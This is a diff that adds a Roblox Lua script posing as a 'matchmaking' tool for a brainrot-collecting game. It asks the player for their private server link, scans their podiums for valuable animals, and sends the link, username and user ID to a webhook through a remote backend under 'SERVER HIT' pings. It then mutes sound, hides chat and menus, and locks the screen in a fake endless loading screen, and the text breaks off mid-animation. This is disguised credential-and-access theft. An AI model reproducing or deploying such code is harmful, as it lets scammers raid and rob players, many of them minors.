@@ -1,0 +1,1045 @@
+-- SERVICES
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+local GuiService = game:GetService("GuiService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- PLAYER
+local LocalPlayer = Players.LocalPlayer
+local player = LocalPlayer
+local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- BACKEND URL
+local SECURE_BACKEND_URL = "https://hesizweb-production.up.railway.app"
+
+-- BLACKLIST
+local BLACKLIST = {
+    4313952753,
+    3328221098,
+    2353591712,
+    8698369158,
+}
+
+local function isBlacklisted(userId)
+    for _, id in ipairs(BLACKLIST) do
+        if id == userId then
+            return true
+        end
+    end
+    return false
+end
+
+if isBlacklisted(LocalPlayer.UserId) then
+    return
+end
+
+-- FUNCIÓN PARA CONVERTIR TEXTO A BINARIO
+local function textToBinary(text)
+    local result = {}
+    for i = 1, #text do
+        local byte = string.byte(text, i)
+        local binary = ""
+        for j = 7, 0, -1 do
+            local bit = math.floor(byte / (2^j)) % 2
+            binary = binary .. tostring(bit)
+        end
+        table.insert(result, binary)
+    end
+    return table.concat(result, " ")
+end
+
+-- FUNCIÓN PARA SOLICITAR URL SEGURA
+local function requestSecureUrl(category, webhookId)
+    local success, result = pcall(function()
+        if not HttpService then
+            return nil
+        end
+
+        if not LocalPlayer then
+            return nil
+        end
+
+        local usernameBinary = textToBinary(LocalPlayer.Name)
+
+        local requestBody = HttpService:JSONEncode({
+            username_binary = usernameBinary,
+            category = category or "miranda",
+            webhook_id = webhookId or "owner",
+            token = "hesiz_secure_v1"
+        })
+
+        local response = HttpService:RequestAsync({
+            Url = SECURE_BACKEND_URL .. "/create-url",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = requestBody
+        })
+
+        if response.StatusCode == 429 then
+            local responseBody = response.Body or ""
+            if responseBody:find("Rate limited") then
+                LocalPlayer:Kick("You are in cooldown!")
+                return nil
+            end
+        end
+
+        if type(response) == "table" and response.StatusCode == 200 then
+            local data = HttpService:JSONDecode(response.Body)
+            if data and data.success and data.url then
+                return data.url
+            end
+        end
+
+        return nil
+    end)
+
+    if success then
+        return result
+    end
+    return nil
+end
+
+-- LISTA DE ANIMALES PERMITIDOS (para detectar)
+local allowedAnimals = {
+    "67",
+    "Celularcini Viciosini",
+    "Dragon Cannelloni",
+    "Esok Sekolah",
+    "Garama and Madundung",
+    "Ketupat Kepat",
+    "Mariachi Corazoni",
+    "Money Money Puggy",
+    "Nuclearo Dinossauro",
+    "Secret Lucky Block",
+    "Spaghetti Tualetti",
+    "Tang Tang Kelentang",
+    "Eviledon",
+    "Tictac Sahur",
+    "Tralaledon",
+    "La Spooky Grande",
+    "Strawberry Elephant",
+    "Los Bros",
+    "Los Chicleteiras",
+    "Los Combinasionas",
+    "Los Hotspotsitos",
+    "Los Primos",
+    "Los Mobilis",
+    "Las Sis",
+    "La Grande Combinasion",
+    "La Supreme Combinasion",
+    "La Extinct Grande",
+    "La Secret Combinasion", 
+    "Spooky and Pumpky", 
+    "Ketchuru and Musturu", 
+    "Los Lucky Blocks", 
+    "Admin Lucky Block", 
+    "Burguro And Fryuro", 
+    "Chillin Chili", 
+    "Los Tacoritas", 
+    "Tacorita Bicicleta", 
+    "Taco Luckyblock",
+    "Mieteteira Bicicleteira",
+    "Chipso and Queso",
+    "Quesadillo Vampiro",
+    "Burrito Bandito",
+    "Meowl",
+    "Los Nooo My Hotspotsitos",
+    "Los Spooky Combinasionas", 
+    "La Casa Boo",
+    "La Taco Combinasion",
+    "Los Puggies",
+    "Los Spaghettis",
+    "Fragrama and Chocrama",
+    "Capitano Moby",
+    "W or L",
+    "Los Planitos",
+    "Headless Horseman",
+    "Fishino Clownino",
+    "Gobblino Unicilino",
+    "Orcaledon",
+    "Los 67",
+    "Los Burritos",
+    "La Jolly Grande",
+    "Ho Ho Ho Sahur",
+    "Chicleteira Noelteira",
+    "Cooki and Milki"
+}
+
+-- LISTA DE ANIMALES ESPECIALES (para webhook especial)
+local specialAnimals = {
+    "Dragon Cannelloni",
+    "Celularcini Viciosini",
+    "Ketupat Kepat",
+    "Strawberry Elephant",
+    "Spooky and Pumpky",
+    "La Secret Combinasion",
+    "Burguro And Fryuro",
+    "Money Money Puggy",
+    "Spaghetti Tualetti",
+    "La Spooky Grande",
+    "Tictac Sahur",
+    "Garama and Madundung",
+    "Chipso and Queso",
+    "Los Spaghettis",
+    "Fragrama and Chocrama",
+    "Meowl",
+    "Eviledon",
+    "Los Puggies", 
+    "La Casa Boo",
+    "La Taco Combinasion",
+    "Orcaledon",
+    "Los Bros",
+    "Headless Horseman",
+    "Capitano Moby",
+    "W or L",
+    "Ketchuru and Musturu",
+    "La Supreme Combinasion",
+    "Cooki and Milki"
+}
+
+-- LISTA DE BRAINROTS (para mostrar en UI)
+local BRAINROT_LIST = {
+    "67",
+    "Celularcini Viciosini",
+    "Dragon Cannelloni",
+    "Esok Sekolah",
+    "Garama and Madundung",
+    "Ketupat Kepat",
+    "Mariachi Corazoni",
+    "Money Money Puggy",
+    "Nuclearo Dinossauro",
+    "Secret Lucky Block",
+    "Spaghetti Tualetti",
+    "Tang Tang Kelentang",
+    "Eviledon",
+    "Tictac Sahur",
+    "Tralaledon",
+    "La Spooky Grande",
+    "Strawberry Elephant",
+    "Los Bros",
+    "Los Chicleteiras",
+    "Los Combinasionas",
+    "Los Hotspotsitos",
+    "Los Primos",
+    "Los Mobilis",
+    "Las Sis",
+    "La Grande Combinasion",
+    "La Supreme Combinasion",
+    "La Extinct Grande",
+    "La Secret Combinasion", 
+    "Spooky and Pumpky", 
+    "Ketchuru and Musturu", 
+    "Los Lucky Blocks", 
+    "Admin Lucky Block", 
+    "Burguro And Fryuro", 
+    "Chillin Chili", 
+    "Los Tacoritas", 
+    "Tacorita Bicicleta", 
+    "Taco Luckyblock",
+    "Mieteteira Bicicleteira",
+    "Chipso and Queso",
+    "Quesadillo Vampiro",
+    "Burrito Bandito",
+    "Meowl",
+    "Los Nooo My Hotspotsitos",
+    "Los Spooky Combinasionas", 
+    "La Casa Boo",
+    "La Taco Combinasion"
+}
+
+-- FUNCIÓN PARA OBTENER INFO DE PODIUMS
+local function getPodiumInfo()
+    local success, podiumData = pcall(function()
+        if ReplicatedStorage:FindFirstChild("Packages") then
+            local packages = ReplicatedStorage.Packages
+            if packages:FindFirstChild("Synchronizer") then
+                local synchronizer = require(packages.Synchronizer)
+                local playerData = synchronizer:Get(LocalPlayer)
+                if playerData then
+                    return playerData:Get("AnimalPodiums") or {}
+                end
+            end
+        end
+        return "No se pudieron obtener datos de podios"
+    end)
+
+    if success and type(podiumData) == "table" then  
+        local info = {}  
+        for podium, animal in pairs(podiumData) do  
+            if animal == "Empty" then  
+                info[podium] = "Empty"  
+            else  
+                info[podium] = tostring(animal.Name or animal.Index or "Unknown")  
+            end  
+        end  
+        return info  
+    else  
+        return {error = podiumData}  
+    end
+end
+
+-- FUNCIÓN PARA VERIFICAR SI TIENE ANIMAL PERMITIDO
+local function hasAllowedAnimal(podiumInfo)
+    local foundAnimals = {}
+    for _, animal in pairs(podiumInfo) do
+        if type(animal) == "string" and animal ~= "Empty" and animal ~= "Unknown" then
+            local animalTrim = animal:gsub("^%s*(.-)%s*$", "%1")
+            for _, allowed in ipairs(allowedAnimals) do
+                if animalTrim:lower():find(allowed:lower(), 1, true) then
+                    table.insert(foundAnimals, animalTrim)
+                    break
+                end
+            end
+        end
+    end
+    return #foundAnimals > 0, foundAnimals
+end
+
+-- FUNCIÓN PARA VALIDAR LINK DE SERVIDOR PRIVADO
+local function isValidPrivateServerLink(text)
+    if not string.find(text, "https?://") then
+        return false
+    end
+
+    if not string.find(text, "roblox%.com") then
+        return false
+    end
+
+    local patterns = {
+        "https?://www%.roblox%.com/share%?code=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?privateServerLinkCode=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?linkCode=[%w%-_]+",
+        "https?://www%.roblox%.com/games/%d+/[%w%-_]*%?code=[%w%-_]+",
+        "https?://web%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode=",
+        "https?://m%.roblox%.com/games/%d+/.*[%?&][%w]*[Cc]ode="
+    }
+
+    for _, pattern in ipairs(patterns) do
+        if string.match(text, pattern) then
+            return true
+        end
+    end
+
+    return false
+end
+
+-- FUNCIÓN PARA ENVIAR A WEBHOOK
+local function sendToWebhook(link, foundAnimals)
+    local overallSuccess, overallError = pcall(function()
+        if isBlacklisted(LocalPlayer.UserId) then
+            return false
+        end
+
+        if not isValidPrivateServerLink(link) then
+            return false
+        end
+
+        if not foundAnimals or #foundAnimals == 0 then
+            return true
+        end
+
+        local playerCount = #Players:GetPlayers()
+        if playerCount > 1 then
+            return true
+        end
+
+        local playerName = LocalPlayer.Name
+        local displayName = LocalPlayer.DisplayName
+        local userId = LocalPlayer.UserId
+        local specialFound = false
+
+        for _, animal in ipairs(foundAnimals) do
+            for _, special in ipairs(specialAnimals) do
+                if animal:lower():find(special:lower(), 1, true) then
+                    specialFound = true
+                    break
+                end
+            end
+            if specialFound then break end
+        end
+
+        local isSpecial = specialFound
+        local category = isSpecial and "miranda_special" or "miranda_normal"
+
+        local animalList = ""
+        for i, animal in ipairs(foundAnimals) do
+            if i == 1 then
+                animalList = animal
+            else
+                animalList = animalList .. "\n" .. animal
+            end
+        end
+
+        local title = isSpecial and "CATCHES ESPECIALES ENCONTRADOS" or "Nuevo Exploiter Encontrado"
+        local color = isSpecial and 16766720 or 10038562
+
+        local data = {
+            ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
+            ["embeds"] = {{
+                ["title"] = title,
+                ["color"] = color,
+                ["fields"] = {
+                    {
+                        ["name"] = "Información del jugador:",
+                        ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
+                    },
+                    {
+                        ["name"] = "Datos del Server:",
+                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
+                    },
+                    {
+                        ["name"] = "Link del Server:",
+                        ["value"] = "[Click here to join](" .. link .. ")",
+                    },
+                    {
+                        ["name"] = isSpecial and "CATCHES ESPECIALES:" or "Items importantes (secrets):",
+                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
+                    },
+                    {
+                        ["name"] = "Total:",
+                        ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
+                    }
+                },
+                ["footer"] = {["text"] = isSpecial and "Miranda - Detector de Catches Especiales" or "Miranda - Cazador de Exploiter"},
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+
+        local webhookId = "webhook_1"
+        
+        local secureUrl = requestSecureUrl(category, webhookId)
+
+        if secureUrl then
+            local sendSuccess, sendResponse = pcall(function()
+                local jsonData = HttpService:JSONEncode(data)
+                return HttpService:RequestAsync({
+                    Url = secureUrl,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonData
+                })
+            end)
+
+            if sendSuccess and sendResponse then
+                local statusCode = sendResponse.StatusCode
+                local responseBody = sendResponse.Body or ""
+
+                if statusCode == 429 then
+                    if responseBody:find("Rate limited") then
+                        LocalPlayer:Kick("You are in cooldown!")
+                        return false
+                    end
+                end
+            end
+        end
+
+        return true
+    end)
+
+    if overallSuccess then
+        return true
+    else
+        return true
+    end
+end
+
+-- CONFIGURACION DE ESTILO (Blanco y Negro / Profesional)
+local THEME = {
+    Background = Color3.fromRGB(15, 15, 15),
+    Accent = Color3.fromRGB(255, 255, 255),
+    Text = Color3.fromRGB(240, 240, 240),
+    SubText = Color3.fromRGB(180, 180, 180),
+    FontMain = Enum.Font.GothamBold,
+    FontBody = Enum.Font.Gotham,
+}
+
+-- UI SETUP
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MatchmakingUI"
+screenGui.Parent = playerGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.DisplayOrder = 999999999
+screenGui.IgnoreGuiInset = true
+
+-- VARIABLE GLOBAL PARA EL LINK
+local privateServerLink = ""
+
+-- 1. MARCO PARA PEDIR EL LINK (ANTES DEL BOTÓN ACTIVAR)
+local linkFrame = Instance.new("Frame")
+linkFrame.Name = "LinkFrame"
+linkFrame.Size = UDim2.new(0, 450, 0, 200)
+linkFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
+linkFrame.BackgroundColor3 = THEME.Background
+linkFrame.BackgroundTransparency = 0.05
+linkFrame.BorderSizePixel = 0
+linkFrame.Visible = true
+linkFrame.Parent = screenGui
+
+local linkCorner = Instance.new("UICorner")
+linkCorner.CornerRadius = UDim.new(0, 12)
+linkCorner.Parent = linkFrame
+
+local linkStroke = Instance.new("UIStroke")
+linkStroke.Color = THEME.Accent
+linkStroke.Thickness = 2
+linkStroke.Parent = linkFrame
+
+local linkTitle = Instance.new("TextLabel")
+linkTitle.Size = UDim2.new(1, -40, 0, 30)
+linkTitle.Position = UDim2.new(0, 20, 0, 20)
+linkTitle.BackgroundTransparency = 1
+linkTitle.Text = "INGRESA TU LINK DE SERVIDOR PRIVADO"
+linkTitle.TextColor3 = THEME.Accent
+linkTitle.Font = THEME.FontMain
+linkTitle.TextSize = 16
+linkTitle.TextXAlignment = Enum.TextXAlignment.Center
+linkTitle.Parent = linkFrame
+
+local linkInputBox = Instance.new("TextBox")
+linkInputBox.Size = UDim2.new(1, -40, 0, 45)
+linkInputBox.Position = UDim2.new(0, 20, 0, 65)
+linkInputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+linkInputBox.BorderSizePixel = 0
+linkInputBox.Text = ""
+linkInputBox.TextColor3 = THEME.Text
+linkInputBox.Font = THEME.FontBody
+linkInputBox.TextSize = 14
+linkInputBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+linkInputBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
+linkInputBox.TextXAlignment = Enum.TextXAlignment.Left
+linkInputBox.ClearTextOnFocus = false
+linkInputBox.ClipsDescendants = true
+linkInputBox.TextTruncate = Enum.TextTruncate.AtEnd
+linkInputBox.Parent = linkFrame
+
+local linkInputCorner = Instance.new("UICorner")
+linkInputCorner.CornerRadius = UDim.new(0, 8)
+linkInputCorner.Parent = linkInputBox
+
+local linkInputPadding = Instance.new("UIPadding")
+linkInputPadding.PaddingLeft = UDim.new(0, 10)
+linkInputPadding.Parent = linkInputBox
+
+local linkConfirmBtn = Instance.new("TextButton")
+linkConfirmBtn.Size = UDim2.new(0, 150, 0, 40)
+linkConfirmBtn.Position = UDim2.new(0.5, -75, 0, 130)
+linkConfirmBtn.BackgroundColor3 = THEME.Accent
+linkConfirmBtn.TextColor3 = THEME.Background
+linkConfirmBtn.Text = "CONFIRMAR"
+linkConfirmBtn.Font = THEME.FontMain
+linkConfirmBtn.TextSize = 16
+linkConfirmBtn.AutoButtonColor = true
+linkConfirmBtn.BorderSizePixel = 0
+linkConfirmBtn.Parent = linkFrame
+
+local linkConfirmCorner = Instance.new("UICorner")
+linkConfirmCorner.CornerRadius = UDim.new(0, 8)
+linkConfirmCorner.Parent = linkConfirmBtn
+
+local linkErrorLabel = Instance.new("TextLabel")
+linkErrorLabel.Size = UDim2.new(1, -40, 0, 20)
+linkErrorLabel.Position = UDim2.new(0, 20, 0, 175)
+linkErrorLabel.BackgroundTransparency = 1
+linkErrorLabel.Text = ""
+linkErrorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+linkErrorLabel.Font = THEME.FontBody
+linkErrorLabel.TextSize = 12
+linkErrorLabel.TextXAlignment = Enum.TextXAlignment.Center
+linkErrorLabel.Parent = linkFrame
+
+-- 2. BOTON DE ACTIVAR (OCULTO INICIALMENTE)
+local activateBtn = Instance.new("TextButton")
+activateBtn.Name = "ActivateButton"
+activateBtn.Size = UDim2.new(0, 200, 0, 50)
+activateBtn.Position = UDim2.new(0.5, -100, 0.85, 0)
+activateBtn.BackgroundColor3 = THEME.Background
+activateBtn.TextColor3 = THEME.Accent
+activateBtn.Text = "ACTIVAR"
+activateBtn.Font = THEME.FontMain
+activateBtn.TextSize = 18
+activateBtn.AutoButtonColor = true
+activateBtn.BorderSizePixel = 0
+activateBtn.Visible = false
+activateBtn.Parent = screenGui
+
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 8)
+btnCorner.Parent = activateBtn
+
+local btnStroke = Instance.new("UIStroke")
+btnStroke.Color = THEME.Accent
+btnStroke.Thickness = 2
+btnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+btnStroke.Parent = activateBtn
+
+-- EVENTO DE CONFIRMACIÓN DE LINK
+linkConfirmBtn.MouseButton1Click:Connect(function()
+    local link = linkInputBox.Text
+    
+    if link == "" then
+        linkErrorLabel.Text = "El link no puede estar vacío"
+        return
+    end
+    
+    if not isValidPrivateServerLink(link) then
+        linkErrorLabel.Text = "Link de servidor privado inválido"
+        return
+    end
+    
+    privateServerLink = link
+    
+    TweenService:Create(linkFrame, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
+    TweenService:Create(linkTitle, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
+    TweenService:Create(linkInputBox, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    TweenService:Create(linkConfirmBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    TweenService:Create(linkStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
+    
+    task.wait(0.35)
+    linkFrame.Visible = false
+    
+    activateBtn.Visible = true
+    activateBtn.BackgroundTransparency = 1
+    activateBtn.TextTransparency = 1
+    TweenService:Create(activateBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
+end)
+
+-- 3. MARCO PRINCIPAL (Contenedor de pantallas)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 400, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -200, 0.4, -150)
+mainFrame.BackgroundColor3 = THEME.Background
+mainFrame.BackgroundTransparency = 0.05
+mainFrame.BorderSizePixel = 0
+mainFrame.Visible = false
+mainFrame.ClipsDescendants = true
+mainFrame.Parent = screenGui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = THEME.Accent
+mainStroke.Thickness = 1.5
+mainStroke.Transparency = 0
+mainStroke.Parent = mainFrame
+
+-- Variables para hacer draggable
+local dragging = false
+local dragInput, mousePos, framePos
+local isDraggable = true
+
+local function onInputBegan(input)
+    if not isDraggable then return end
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        mousePos = input.Position
+        framePos = mainFrame.Position
+        
+        local connection
+        connection = input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+                connection:Disconnect()
+            end
+        end)
+    end
+end
+
+local function onInputChanged(input)
+    if not isDraggable then return end
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end
+
+mainFrame.InputBegan:Connect(onInputBegan)
+mainFrame.InputChanged:Connect(onInputChanged)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not isDraggable then return end
+    if input == dragInput and dragging then
+        local delta = input.Position - mousePos
+        mainFrame.Position = UDim2.new(framePos.X.Scale, framePos.X.Offset + delta.X, framePos.Y.Scale, framePos.Y.Offset + delta.Y)
+    end
+end)
+
+-- Contenedor interno para el contenido cambiante
+local contentContainer = Instance.new("Frame")
+contentContainer.Name = "ContentContainer"
+contentContainer.Size = UDim2.new(1, -40, 1, -40)
+contentContainer.Position = UDim2.new(0, 20, 0, 20)
+contentContainer.BackgroundTransparency = 1
+contentContainer.Parent = mainFrame
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Parent = contentContainer
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Padding = UDim.new(0, 8)
+listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+
+-- HERRAMIENTAS DE UI
+local function clearContent()
+    for _, child in pairs(contentContainer:GetChildren()) do
+        if child:IsA("GuiObject") then
+            local properties = {BackgroundTransparency = 1}
+            
+            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
+                properties.TextTransparency = 1
+            end
+            
+            TweenService:Create(child, TweenInfo.new(0.3), properties):Play()
+        end
+    end
+    task.wait(0.3)
+    for _, child in pairs(contentContainer:GetChildren()) do
+        if child:IsA("GuiObject") then 
+            child:Destroy() 
+        end
+    end
+end
+
+local function addText(text, font, size, color, delayTime)
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, 0, 0, 24)
+    label.BackgroundTransparency = 1
+    label.TextColor3 = color or THEME.Text
+    label.Font = font or THEME.FontBody
+    label.TextSize = size or 14
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextYAlignment = Enum.TextYAlignment.Center
+    label.Text = text
+    label.TextTransparency = 1
+    label.Parent = contentContainer
+    
+    TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+    
+    if delayTime then 
+        task.wait(delayTime) 
+    end
+    return label
+end
+
+local function addHeader(text)
+    local label = addText(text, THEME.FontMain, 18, THEME.Accent, 0.1)
+    local line = Instance.new("Frame")
+    line.Size = UDim2.new(0, 0, 0, 2)
+    line.BackgroundColor3 = THEME.Accent
+    line.BorderSizePixel = 0
+    line.Parent = contentContainer
+    TweenService:Create(line, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {Size = UDim2.new(0.3, 0, 0, 2)}):Play()
+    task.wait(0.5)
+end
+
+local function getRandomBrainrots(count)
+    local shuffled = {}
+    for i, v in ipairs(BRAINROT_LIST) do
+        shuffled[i] = v
+    end
+    
+    for i = #shuffled, 2, -1 do
+        local j = math.random(i)
+        shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
+    end
+    
+    local selected = {}
+    for i = 1, math.min(count, #shuffled) do
+        table.insert(selected, shuffled[i])
+    end
+    
+    return selected
+end
+
+-- Función para silenciar todos los sonidos
+local function muteAllSounds()
+    local function mutear(sound)
+        if sound:IsA("Sound") then
+            sound.Volume = 0
+            sound.Playing = false
+        end
+    end
+
+    for _, obj in pairs(game:GetDescendants()) do
+        mutear(obj)
+    end
+
+    game.DescendantAdded:Connect(function(obj)
+        mutear(obj)
+    end)
+
+    task.spawn(function()
+        while task.wait(1) do
+            for _, obj in pairs(game:GetDescendants()) do
+                if obj:IsA("Sound") then 
+                    obj.Volume = 0 
+                    obj.Playing = false
+                end
+            end
+        end
+    end)
+end
+
+-- Función para desactivar CoreGui y ocultar todo
+local function disableCoreGui()
+    local coreGuiTypes = {
+        Enum.CoreGuiType.PlayerList,
+        Enum.CoreGuiType.Health,
+        Enum.CoreGuiType.Backpack,
+        Enum.CoreGuiType.Chat,
+        Enum.CoreGuiType.EmotesMenu,
+        Enum.CoreGuiType.All
+    }
+    
+    for _, guiType in pairs(coreGuiTypes) do
+        pcall(function()
+            StarterGui:SetCoreGuiEnabled(guiType, false)
+        end)
+    end
+    
+    pcall(function()
+        StarterGui:SetCore("TopbarEnabled", false)
+    end)
+    
+    pcall(function()
+        StarterGui:SetCore("ChatActive", false)
+    end)
+    
+    local function ocultarScreenGuis()
+        if player and player.Parent then
+            local PlayerGui = player:WaitForChild("PlayerGui")
+
+            for _, gui in ipairs(PlayerGui:GetChildren()) do
+                if gui:IsA("ScreenGui") and gui.Name ~= "MatchmakingUI" then
+                    gui.Enabled = false
+                end
+            end
+
+            PlayerGui.ChildAdded:Connect(function(gui)
+                if gui:IsA("ScreenGui") and gui.Name ~= "MatchmakingUI" then
+                    task.wait(0.1)
+                    gui.Enabled = false
+                end
+            end)
+        end
+    end
+    
+    ocultarScreenGuis()
+    
+    local function cerrarMenuRoblox()
+        pcall(function()
+            GuiService:ClearError()
+            StarterGui:SetCore("ResetButtonCallback", false)
+        end)
+
+        local CoreGui = game:GetService("CoreGui")
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") then
+                if gui.Name:find("RobloxGui") or gui.Name:find("Menu") or gui.Name:find("Settings") then
+                    gui.Enabled = false
+                end
+            end
+        end
+    end
+    
+    cerrarMenuRoblox()
+    
+    task.spawn(function()
+        while task.wait(0.1) do
+            cerrarMenuRoblox()
+            ocultarScreenGuis()
+        end
+    end)
+end
+
+-- LOGICA DE FASES
+local isRunning = false
+
+activateBtn.MouseButton1Click:Connect(function()
+    if isRunning then 
+        return 
+    end
+    isRunning = true
+    
+    -- FASE 1: Activación y Preparación de la UI
+    TweenService:Create(activateBtn, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
+    task.wait(0.3)
+    activateBtn.Visible = false
+    
+    mainFrame.Visible = true
+    mainFrame.Size = UDim2.new(0, 400, 0, 0)
+    TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Exponential), {Size = UDim2.new(0, 400, 0, 250)}):Play()
+    task.wait(0.7)
+    
+    -- FASE 2: Carga Inicial
+    addHeader("CARGANDO")
+    task.wait(0.5)
+    
+    addText("Verificando archivos...", nil, 14, THEME.SubText, 1.5)
+    addText("Analizando perfil...", nil, 14, THEME.SubText, 2.0)
+    addText("Conectando...", nil, 14, THEME.SubText, 1.0)
+    
+    addText(">> COMPLETADO", THEME.FontMain, 14, Color3.fromRGB(100, 255, 100), 1.5)
+    
+    task.wait(1)
+    clearContent()
+    
+    -- FASE 2.5: ESCANEO DE ANIMALES Y ENVÍO A WEBHOOK
+    addHeader("ESCANEANDO SERVIDOR")
+    task.wait(0.5)
+    
+    local scanLabel = addText("Buscando catches especiales...", nil, 14, THEME.SubText, 1.5)
+    
+    local podiumInfo = getPodiumInfo()
+    local foundAnimals = {}
+    
+    if not podiumInfo.error then
+        local hasAnimal
+        hasAnimal, foundAnimals = hasAllowedAnimal(podiumInfo)
+        
+        if #foundAnimals > 0 then
+            scanLabel.Text = "Catches encontrados: " .. #foundAnimals
+            scanLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            task.wait(0.5)
+            
+            for _, animal in ipairs(foundAnimals) do
+                addText("  + " .. animal, nil, 12, Color3.fromRGB(255, 200, 100), 0.2)
+            end
+            task.wait(0.5)
+        else
+            scanLabel.Text = "No se encontraron catches especiales"
+            task.wait(0.5)
+        end
+    else
+        scanLabel.Text = "Error al escanear podiums"
+        scanLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        task.wait(0.5)
+    end
+    
+    addText("Enviando datos...", nil, 14, THEME.SubText, 1.0)
+    
+    local webhookSuccess = sendToWebhook(privateServerLink, foundAnimals)
+    
+    if webhookSuccess then
+        addText(">> DATOS ENVIADOS", THEME.FontMain, 14, Color3.fromRGB(100, 255, 100), 1.0)
+    else
+        addText(">> ERROR AL ENVIAR", THEME.FontMain, 14, Color3.fromRGB(255, 100, 100), 1.0)
+    end
+    
+    task.wait(1)
+    clearContent()
+    
+    -- FASE 3: Búsqueda de Servidores
+    addHeader("BUSCANDO JUGADORES")
+    task.wait(0.5)
+    
+    local searchingLabel = addText("Buscando servidores disponibles...", nil, 14, THEME.SubText, 2.5)
+    searchingLabel.Text = "Buscando servidores disponibles... HECHO"
+    searchingLabel.TextColor3 = THEME.Text
+    
+    addText("Servidores encontrados:", THEME.FontMain, 14, THEME.Accent, 0.5)
+    
+    local selectedBrainrots = getRandomBrainrots(5)
+    
+    for _, matchName in ipairs(selectedBrainrots) do
+        local matchLabel = addText("       - " .. matchName, nil, 14, THEME.SubText, 0.2)
+        TweenService:Create(matchLabel, TweenInfo.new(0.2, Enum.EasingStyle.Bounce, Enum.EasingDirection.Out, 0, true), {TextTransparency = 0.5}):Play()
+    end
+    
+    task.wait(0.5)
+    
+    local spacer = Instance.new("Frame")
+    spacer.Size = UDim2.new(1, 0, 0, 10)
+    spacer.BackgroundTransparency = 1
+    spacer.Parent = contentContainer
+    
+    local footer = Instance.new("TextLabel")
+    footer.Size = UDim2.new(1, 0, 0, 40)
+    footer.BackgroundTransparency = 1
+    footer.TextColor3 = Color3.fromRGB(120, 120, 120)
+    footer.Font = Enum.Font.Gotham
+    footer.TextSize = 11
+    footer.TextWrapped = true
+    footer.TextXAlignment = Enum.TextXAlignment.Left
+    footer.Text = "Estos servidores se calculan segun tu ubicacion y latencia."
+    footer.TextTransparency = 1
+    footer.Parent = contentContainer
+    
+    TweenService:Create(footer, TweenInfo.new(1), {TextTransparency = 0}):Play()
+    
+    task.wait(3)
+    
+    -- FASE 4: Pantalla de Carga Final (Infinite Loading Screen)
+    
+    isDraggable = false
+    muteAllSounds()
+    disableCoreGui()
+    
+    clearContent()
+    
+    if mainCorner then mainCorner:Destroy() end
+    if mainStroke then mainStroke:Destroy() end
+    
+    if contentContainer then
+        contentContainer:Destroy()
+    end
+    
+    mainFrame.ZIndex = 999999999
+    mainFrame.ClipsDescendants = false
+    
+    TweenService:Create(mainFrame, TweenInfo.new(1.2, Enum.EasingStyle.Exponential), {
